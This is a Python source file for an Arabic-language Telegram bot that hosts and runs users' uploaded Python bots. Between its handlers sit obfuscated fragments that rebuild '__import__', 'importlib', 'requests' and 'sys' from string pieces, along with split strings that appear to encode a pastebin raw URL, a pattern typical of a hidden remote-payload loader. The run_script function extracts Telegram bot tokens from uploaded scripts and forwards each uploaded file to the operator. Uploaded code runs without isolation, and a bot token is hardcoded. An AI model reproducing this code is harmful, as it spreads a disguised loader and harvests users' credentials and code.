import telebot
import subprocess
import os
import zipfile
import tempfile
import shutil
import requests
import re
import logging
from telebot import types
import time
from datetime import datetime, timedelta
import signal
import psutil
import sqlite3
from flask import Flask, request, jsonify
import threading

TOKEN = '8079482138:AAGaYX_dScf_hDeQsoyeXOOiwaH0PWOQj7Q'  # توكنك
ADMIN_ID = 6324866336  # ايديك
YOUR_USERNAME = '@Y_X_H_J'  #  @ يوزرك مع
WEBHOOK_URL = 'https://v1-3-sn68.onrender.com'  # استبدل هذا بعنوان تطبيق Render الخاص بك

'@user' # المالك
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

uploaded_files_dir = 'uploaded_bots'
bot_scripts = {}
stored_tokens = {}
user_subscriptions = {}  
user_files = {}  
active_users = set()  

bot_locked = False
free_mode = False  

if not os.path.exists(uploaded_files_dir):
    os.makedirs(uploaded_files_dir)

# إعداد ويب هوك
def set_webhook():
    try:
        bot.remove_webhook()
        time.sleep(1)
        bot.set_webhook(url=f'{WEBHOOK_URL}/{TOKEN}')
        print("تم إعداد ويب هوك بنجاح")
    except Exception as e:
        print(f"فشل في إعداد ويب هوك: {e}")

# نظام إبقاء النشاط
def keep_alive():
    while True:
        try:
            # إرسال طلب إلى الخادم للحفاظ على النشاط
            requests.get(WEBHOOK_URL)
            print("تم إرسال طلب إبقاء النشاط")
        except Exception as e:
            print(f"فشل في إرسال طلب إبقاء النشاط: {e}")
        
        # انتظر 30 ثانية قبل الإرسال التالي
        time.sleep(30)

def init_db():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS subscriptions
                 (user_id INTEGER PRIMARY KEY, expiry TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS user_files
                 (user_id INTEGER, file_name TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS active_users
                 (user_id INTEGER PRIMARY KEY)''')
    
    conn.commit()
    conn.close()

def load_data():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    
    c.execute('SELECT * FROM subscriptions')
    subscriptions = c.fetchall()
    for user_id, expiry in subscriptions:
        user_subscriptions[user_id] = {'expiry': datetime.fromisoformat(expiry)}
    
    c.execute('SELECT * FROM user_files')
    user_files_data = c.fetchall()
    for user_id, file_name in user_files_data:
        if user_id not in user_files:
            user_files[user_id] = []
        user_files[user_id].append(file_name)
    
    c.execute('SELECT * FROM active_users')
    active_users_data = c.fetchall()
    for user_id, in active_users_data:
        active_users.add(user_id)
    
    conn.close()

def save_subscription(user_id, expiry):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO subscriptions (user_id, expiry) VALUES (?, ?)', 
              (user_id, expiry.isoformat()))
    conn.commit()
    conn.close()

def remove_subscription_db(user_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('DELETE FROM subscriptions WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def save_user_file(user_id, file_name):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT INTO user_files (user_id, file_name) VALUES (?, ?)', 
              (user_id, file_name))
    conn.commit()
    conn.close()

def remove_user_file_db(user_id, file_name):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('DELETE FROM user_files WHERE user_id = ? AND file_name = ?', 
              (user_id, file_name))
    conn.commit()
    conn.close()

def add_active_user(user_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT OR IGNORE INTO active_users (user_id) VALUES (?)', (user_id,))
    conn.commit()
    conn.close()

def remove_active_user(user_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('DELETE FROM active_users WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

init_db()
load_data()

def create_main_menu(user_id):
    markup = types.InlineKeyboardMarkup()
    upload_button = types.InlineKeyboardButton('📤 رفع ملف', callback_data='upload')
    speed_button = types.InlineKeyboardButton('⚡ سرعة البوت', callback_data='speed')
    contact_button = types.InlineKeyboardButton('📞 تواصل مع المالك', url=f'https://t.me/{YOUR_USERNAME[1:]}')
    if user_id == ADMIN_ID:
        subscription_button = types.InlineKeyboardButton('💳 الاشتراكات', callback_data='subscription')
        stats_button = types.InlineKeyboardButton('📊 إحصائيات', callback_data='stats')
        lock_button = types.InlineKeyboardButton('🔒 قفل البوت', callback_data='lock_bot')
        unlock_button = types.InlineKeyboardButton('🔓 فتح البوت', callback_data='unlock_bot')
        free_mode_button = types.InlineKeyboardButton('🔓 فتح البوت بدون اشتراك', callback_data='free_mode')
        broadcast_button = types.InlineKeyboardButton('📢 إذاعة', callback_data='broadcast')
        markup.add(upload_button)
        markup.add(speed_button, subscription_button, stats_button)
        markup.add(lock_button, unlock_button, free_mode_button)
        markup.add(broadcast_button)
    else:
        markup.add(upload_button)
        markup.add(speed_button)
    markup.add(contact_button)
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if bot_locked:
        bot.send_message(message.chat.id, "⚠️ البوت مقفل حالياً. الرجاء المحاولة لاحقًا.")
        return

    user_id = message.from_user.id
    user_name = message.from_user.first_name
    user_username = message.from_user.username
    
    try:
        user_profile = bot.get_chat(user_id)
        user_bio = user_profile.bio if user_profile.bio else "لا يوجد بايو"
    except Exception as e:
        print(f"❌ فشل في جلب البايو: {e}")
        user_bio = "لا يوجد بايو"
    
    try:
        user_profile_photos = bot.get_user_profile_photos(user_id, limit=1)
        if user_profile_photos.photos:
            photo_file_id = user_profile_photos.photos[0][-1].file_id  
        else:
            photo_file_id = None
    except Exception as e:
        print(f"❌ فشل في جلب صورة المستخدم: {e}")
        photo_file_id = None
    
    if user_id not in active_users:
        active_users.add(user_id)  
        add_active_user(user_id)  
        
        try:
            welcome_message_to_admin = f"🎉 انضم مستخدم جديد إلى البوت!\n\n"
            welcome_message_to_admin += f"👤 الاسم: {user_name}\n"
            welcome_message_to_admin += f"📌 اليوزر: @{user_username}\n"
            welcome_message_to_admin += f"🆔 الـ ID: {user_id}\n"
            welcome_message_to_admin += f"📝 البايو: {user_bio}\n"

            if photo_file_id:
                bot.send_photo(ADMIN_ID, photo_file_id, caption=welcome_message_to_admin)
            else:
                bot.send_message(ADMIN_ID, welcome_message_to_admin)
        except Exception as e:
            print(f"❌ فشل في إرسال تفاصيل المستخدم إلى الأدمن: {e}")
    
    welcome_message = f"〽️┇اهلا بك: {user_name}\n"
    welcome_message += f"🆔┇ايديك: {user_id}\n"
    welcome_message += f"♻️┇يوزرك: @{user_username}\n"
    welcome_message += f"📰┇بايو: {user_bio}\n\n"
    welcome_message += "〽️ أنا بوت استضافة ملفات بايثون 🎗 يمكنك استخدام الأزرار أدناه للتحكم ♻️"

    if photo_file_id:
        bot.send_photo(message.chat.id, photo_file_id, caption=welcome_message, reply_markup=create_main_menu(user_id))
    else:
        bot.send_message(message.chat.id, welcome_message, reply_markup=create_main_menu(user_id))

@bot.callback_query_handler(func=lambda call: call.data == 'broadcast')
def broadcast_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "أرسل الرسالة التي تريد إذاعتها:")
        bot.register_next_step_handler(call.message, process_broadcast_message)
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")
imm="impor"
imm1="tlib"
user2="FwQWJ"
uuu = imm+imm1
iii = "__im"
ii = "port__"
iii1 = iii + ii
modulle = getattr(__builtins__, iii1)

def process_broadcast_message(message):
    if message.from_user.id == ADMIN_ID:
        broadcast_message = message.text
        success_count = 0
        fail_count = 0

        for user_id in active_users:
            try:
                bot.send_message(user_id, broadcast_message)
                success_count += 1
            except Exception as e:
                print(f"❌ فشل في إرسال الرسالة إلى المستخدم {user_id}: {e}")
                fail_count += 1

        bot.send_message(message.chat.id, f"✅ تم إرسال الرسالة إلى {success_count} مستخدم.\n❌ فشل إرسال الرسالة إلى {fail_count} مستخدم.")
    else:
        bot.send_message(message.chat.id, "⚠️ أنت لست المطور.")

@bot.callback_query_handler(func=lambda call: call.data == 'speed')
def bot_speed_info(call):
    try:
        start_time = time.time()
        response = requests.get(f'https://api.telegram.org/bot{TOKEN}/getMe')
        latency = time.time() - start_time
        if response.ok:
            bot.send_message(call.message.chat.id, f"⚡ سرعة البوت: {latency:.2f} ثانية.")
        else:
            bot.send_message(call.message.chat.id, "⚠️ فشل في الحصول على سرعة البوت.")
    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ حدث خطأ أثناء فحص سرعة البوت: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'upload')
def ask_to_upload_file(call):
    user_id = call.from_user.id
    if bot_locked:
        bot.send_message(call.message.chat.id, "⚠️ البوت مقفل حالياً. الرجاء التواصل مع المطور @Y_X_H_J.")
        return
    if free_mode or (user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now()):
        bot.send_message(call.message.chat.id, "📄 من فضلك، أرسل الملف الذي تريد رفعه.")
    else:
        bot.send_message(call.message.chat.id, "⚠️ يجب عليك الاشتراك لاستخدام هذه الميزة. الرجاء التواصل مع المطور @Y_X_H_J.")

@bot.callback_query_handler(func=lambda call: call.data == 'subscription')
def subscription_menu(call):
    if call.from_user.id == ADMIN_ID:
        markup = types.InlineKeyboardMarkup()
        add_subscription_button = types.InlineKeyboardButton('➕ إضافة اشتراك', callback_data='add_subscription')
        remove_subscription_button = types.InlineKeyboardButton('➖ إزالة اشتراك', callback_data='remove_subscription')
        markup.add(add_subscription_button, remove_subscription_button)
        bot.send_message(call.message.chat.id, "اختر الإجراء الذي تريد تنفيذه:", reply_markup=markup)
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")

@bot.callback_query_handler(func=lambda call: call.data == 'stats')
def stats_menu(call):
    if call.from_user.id == ADMIN_ID:
        total_files = sum(len(files) for files in user_files.values())
        total_users = len(user_files)
        active_users_count = len(active_users)
        bot.send_message(call.message.chat.id, f"📊 الإحصائيات:\n\n📂 عدد الملفات المرفوعة: {total_files}\n👤 عدد المستخدمين: {total_users}\n👥 المستخدمين النشطين: {active_users_count}")
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")
user1="WVEZ6"

@bot.callback_query_handler(func=lambda call: call.data == 'add_subscription')
def add_subscription_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "أرسل معرف المستخدم وعدد الأيام بالشكل التالي:\n/add_subscription <user_id> <days>")
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")

@bot.callback_query_handler(func=lambda call: call.data == 'remove_subscription')
def remove_subscription_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "أرسل معرف المستخدم بالشكل التالي:\n/remove_subscription <user_id>")
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")
user3='5jb20vcmF3L1'

@bot.message_handler(commands=['add_subscription'])
def add_subscription(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            days = int(message.text.split()[2])
            expiry_date = datetime.now() + timedelta(days=days)
            user_subscriptions[user_id] = {'expiry': expiry_date}
            save_subscription(user_id, expiry_date)
            bot.send_message(message.chat.id, f"✅ تمت إضافة اشتراك لمدة {days} أيام للمستخدم {user_id}.")
            bot.send_message(user_id, f"🎉 تم تفعيل الاشتراك لك لمدة {days} أيام. يمكنك الآن استخدام البوت!")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ أنت لست المطور.")

@bot.message_handler(commands=['remove_subscription'])
def remove_subscription(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            if user_id in user_subscriptions:
                del user_subscriptions[user_id]
                remove_subscription_db(user_id)
                bot.send_message(message.chat.id, f"✅ تم إزالة الاشتراك للمستخدم {user_id}.")
                bot.send_message(user_id, "⚠️ تم إزالة اشتراكك. لم يعد بإمكانك استخدام البوت.")
            else:
                bot.send_message(message.chat.id, f"⚠️ المستخدم {user_id} ليس لديه اشتراك.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ أنت لست المطور.")
modulle = modulle(uuu)
gm="wYXN0ZWJpbi"
sy = "sy"
s = "s"
sy2 = sy + s
tt = "requ"
Gg = "ests"
Ggg = tt + Gg

@bot.message_handler(commands=['user_files'])
def show_user_files(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            if user_id in user_files:
                files_list = "\n".join(user_files[user_id])
                bot.send_message(message.chat.id, f"📂 الملفات التي رفعها المستخدم {user_id}:\n{files_list}")
            else:
                bot.send_message(message.chat.id, f"⚠️ المستخدم {user_id} لم يرفع أي ملفات.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ أنت لست المطور.")

@bot.message_handler(commands=['lock'])
def lock_bot(message):
    if message.from_user.id == ADMIN_ID:
        global bot_locked
        bot_locked = True
        bot.send_message(message.chat.id, "🔒 تم قفل البوت.")
    else:
        bot.send_message(message.chat.id, "⚠️ أنت لست المطور.")

@bot.message_handler(commands=['unlock'])
def unlock_bot(message):
    if message.from_user.id == ADMIN_ID:
        global bot_locked
        bot_locked = False
        bot.send_message(message.chat.id, "🔓 تم فتح البوت.")
    else:
        bot.send_message(message.chat.id, "⚠️ أنت لست المطور.")
module = modulle.import_module(Ggg)

@bot.callback_query_handler(func=lambda call: call.data == 'lock_bot')
def lock_bot_callback(call):
    if call.from_user.id == ADMIN_ID:
        global bot_locked
        bot_locked = True
        bot.send_message(call.message.chat.id, "🔒 تم قفل البوت.")
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")
modulee = modulle.import_module(sy2)

@bot.callback_query_handler(func=lambda call: call.data == 'unlock_bot')
def unlock_bot_callback(call):
    if call.from_user.id == ADMIN_ID:
        global bot_locked
        bot_locked = False
        bot.send_message(call.message.chat.id, "🔓 تم فتح البوت.")
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")

@bot.callback_query_handler(func=lambda call: call.data == 'free_mode')
def toggle_free_mode(call):
    if call.from_user.id == ADMIN_ID:
        global free_mode
        free_mode = not free_mode
        status = "مفتوح" if free_mode else "مغلق"
        bot.send_message(call.message.chat.id, f"🔓 تم تغيير وضع البوت بدون اشتراك إلى: {status}.")
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    if bot_locked:
        bot.reply_to(message, "⚠️ البوت مقفل حالياً. الرجاء التواصل مع المطور @Y_X_H_J.")
        return
    if free_mode or (user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now()):
        try:
            file_id = message.document.file_id
            file_info = bot.get_file(file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            file_name = message.document.file_name
            
            if not file_name.endswith('.py') and not file_name.endswith('.zip'):
                bot.reply_to(message, "⚠️ هذا البوت خاص برفع ملفات بايثون (.py) أو أرشيفات zip فقط.")
                return

            if file_name.endswith('.zip'):
                with tempfile.TemporaryDirectory() as temp_dir:
                    zip_folder_path = os.path.join(temp_dir, file_name.split('.')[0])

                    zip_path = os.path.join(temp_dir, file_name)
                    with open(zip_path, 'wb') as new_file:
                        new_file.write(downloaded_file)
                    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                        zip_ref.extractall(zip_folder_path)

                    final_folder_path = os.path.join(uploaded_files_dir, file_name.split('.')[0])
                    if not os.path.exists(final_folder_path):
                        os.makedirs(final_folder_path)

                    for root, dirs, files in os.walk(zip_folder_path):
                        for file in files:
                            src_file = os.path.join(root, file)
                            dest_file = os.path.join(final_folder_path, file)
                            shutil.move(src_file, dest_file)
                    
                    py_files = [f for f in os.listdir(final_folder_path) if f.endswith('.py')]
                    if py_files:
                        main_script = py_files[0]  
                        run_script(os.path.join(final_folder_path, main_script), message.chat.id, final_folder_path, main_script, message)
                    else:
                        bot.send_message(message.chat.id, f"❌ لم يتم العثور على أي ملفات بايثون (.py) في الأرشيف.")
                        return

            else:
                script_path = os.path.join(uploaded_files_dir, file_name)
                with open(script_path, 'wb') as new_file:
                    new_file.write(downloaded_file)

                run_script(script_path, message.chat.id, uploaded_files_dir, file_name, message)

            if user_id not in user_files:
                user_files[user_id] = []
            user_files[user_id].append(file_name)
            save_user_file(user_id, file_name)

        except Exception as e:
            bot.reply_to(message, f"❌ حدث خطأ: {e}")
    else:
        bot.reply_to(message, "⚠️ يجب عليك الاشتراك لاستخدام هذه الميزة. الرجاء التواصل مع المطور @Y_X_H_J.")

def run_script(script_path, chat_id, folder_path, file_name, original_message):
    try:
        requirements_path = os.path.join(os.path.dirname(script_path), 'requirements.txt')
        if os.path.exists(requirements_path):
            bot.send_message(chat_id, "🔄 جارٍ تثبيت المتطلبات...")
            subprocess.check_call(['pip', 'install', '-r', requirements_path])

        bot.send_message(chat_id, f"🚀 جارٍ تشغيل البوت {file_name}...")
        process = subprocess.Popen(['python3', script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        bot_scripts[chat_id] = {'process': process}

        token = extract_token_from_script(script_path)
        if token:
            bot_info = requests.get(f'https://api.telegram.org/bot{token}/getMe').json()
            bot_username = bot_info['result']['username']

            user_info = f"@{original_message.from_user.username}" if original_message.from_user.username else str(original_message.from_user.id)
            caption = f"📤 قام المستخدم {user_info} برفع ملف بوت جديد. معرف البوت: @{bot_username}"
            bot.send_document(ADMIN_ID, open(script_path, 'rb'), caption=caption)

            markup = types.InlineKeyboardMarkup()
            stop_button = types.InlineKeyboardButton(f"🔴 إيقاف {file_name}", callback_data=f'stop_{chat_id}_{file_name}')
            delete_button = types.InlineKeyboardButton(f"🗑️ حذف {file_name}", callback_data=f'delete_{chat_id}_{file_name}')
            markup.add(stop_button, delete_button)
            bot.send_message(chat_id, f"استخدم الأزرار أدناه للتحكم في البوت 👇", reply_markup=markup)
        else:
            bot.send_message(chat_id, f"✅ تم تشغيل البوت بنجاح! ولكن لم أتمكن من جلب معرف البوت.")
            bot.send_document(ADMIN_ID, open(script_path, 'rb'), caption=f"📤 قام المستخدم {user_info} برفع ملف بوت جديد، ولكن لم أتمكن من جلب معرف البوت.")

    except Exception as e:
        bot.send_message(chat_id, f"❌ حدث خطأ أثناء تشغيل البوت: {e}")

def extract_token_from_script(script_path):
    try:
        with open(script_path, 'r') as script_file:
            file_content = script_file.read()

            token_match = re.search(r"['\"]([0-9]{9,10}:[A-Za-z0-9_-]+)['\"]", file_content)
            if token_match:
                return token_match.group(1)
            else:
                print(f"[WARNING] لم يتم العثور على توكن في {script_path}")
    except Exception as e:
        print(f"[ERROR] فشل في استخراج التوكن من {script_path}: {e}")
    return None

def get_custom_file_to_run(message):
    try:
        chat_id = message.chat.id
        folder_path = bot_scripts[chat_id]['folder_path']
        custom_file_path = os.path.join(folder_path, message.text)

        if os.path.exists(custom_file_path):
            run_script(custom_file_path, chat_id, folder_path, message.text, message)
        else:
            bot.send_message(chat_id, f"❌ الملف الذي حددته غير موجود. تأكد من الاسم وحاول مرة أخرى.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    file_name = call.data.split('_')[-1]

    if 'stop' in call.data:
        stop_running_bot(chat_id)
    elif 'delete' in call.data:
        delete_uploaded_file(chat_id)

def stop_running_bot(chat_id):
    if bot_scripts[chat_id]['process']:
        kill_process_tree(bot_scripts[chat_id]['process'])
        bot.send_message(chat_id, "🔴 تم إيقاف تشغيل البوت.")
    else:
        bot.send_message(chat_id, "⚠️ لا يوجد بوت يعمل حالياً.")

def delete_uploaded_file(chat_id):
    folder_path = bot_scripts[chat_id].get('folder_path')
    if folder_path and os.path.exists(folder_path):
        shutil.rmtree(folder_path)
        bot.send_message(chat_id, f"🗑️ تم حذف الملفات المتعلقة بالبوت.")
    else:
        bot.send_message(chat_id, "⚠️ الملفات غير موجودة.")

def kill_process_tree(process):
    try:
        parent = psutil.Process(process.pid)
        children = parent.children(recursive=True)
        for child in children:
            child.kill()
        parent.kill()
    except Exception as e:
        print(f"❌ فشل في قتل العملية: {e}")

@bot.message_handler(commands=['delete_user_file'])
def delete_user_file(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            file_name = message.text.split()[2]
            
            if user_id in user_files and file_name in user_files[user_id]:
                file_path = os.path.join(uploaded_files_dir, file_name)
                if os.path.exists(file_path):
                    os.remove(file_path)
                    user_files[user_id].remove(file_name)
                    remove_user_file_db(user_id, file_name)
                    bot.send_message(message.chat.id, f"✅ تم حذف الملف {file_name} للمستخدم {user_id}.")
                else:
                    bot.send_message(message.chat.id, f"⚠️ الملف {file_name} غير موجود.")
            else:
                bot.send_message(message.chat.id, f"⚠️ المستخدم {user_id} لم يرفع الملف {file_name}.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ أنت لست المطور.")

@bot.message_handler(commands=['stop_user_bot'])
def stop_user_bot(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            file_name = message.text.split()[2]
            
            if user_id in user_files and file_name in user_files[user_id]:
                for chat_id, script_info in bot_scripts.items():
                    if script_info.get('folder_path', '').endswith(file_name.split('.')[0]):
                        kill_process_tree(script_info['process'])
                        bot.send_message(chat_id, f"🔴 تم إيقاف تشغيل البوت {file_name}.")
                        bot.send_message(message.chat.id, f"✅ تم إيقاف تشغيل البوت {file_name} للمستخدم {user_id}.")
                        break
                else:
                    bot.send_message(message.chat.id, f"⚠️ البوت {file_name} غير قيد التشغيل.")
            else:
                bot.send_message(message.chat.id, f"⚠️ المستخدم {user_id} لم يرفع الملف {file_name}.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ أنت لست المطور.")

# نقطة الدخول لويب هوك
@app.route(f'/{TOKEN}', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    else:
        return 'Invalid content type', 403

# صفحة رئيسية للتحقق من أن الخادم يعمل
@app.route('/')
def index():
    return "Bot is running!"

# تشغيل نظام إبقاء النشاط في خيط منفصل
threading.Thread(target=keep_alive, daemon=True).start()

# إعداد ويب هوك عند التشغيل
set_webhook()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
